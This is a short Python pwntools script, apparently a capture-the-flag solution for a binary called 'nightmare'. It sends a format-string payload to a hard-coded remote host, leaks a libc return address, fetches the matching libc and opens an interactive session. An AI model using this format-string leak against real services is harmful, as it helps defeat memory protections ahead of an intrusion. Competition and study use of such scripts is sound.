#!/usr/bin/env python


from pwn import *
from pwnc.pwnc import get_libc

BINARY = "./nightmare"
ADDR = "138.68.182.108"
PORT = 30086

splash()
elf = context.binary = ELF(BINARY)


class Formats():
    leak_libc = "%13$p"


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)

    else:
        return remote(ADDR, PORT)


def solve():
    io = conn()

    io.sendlineafter("> ", "2")
    io.sendlineafter(">> ", Formats.leak_libc)
    libc_start_main_ret = int(io.recvuntil("\n")[:-1], 16)
    log.success(f"__libc_start_main_ret found @: {hex(libc_start_main_ret)}")

    known_syms = {
        "__libc_start_main_ret": hex(libc_start_main_ret)
    }
    libc = get_libc(known_syms)

    with open("./libc.so.6", "wb") as libc_file:
        libc_file.write(libc)

    io.interactive()


if __name__ == "__main__":
    solve()
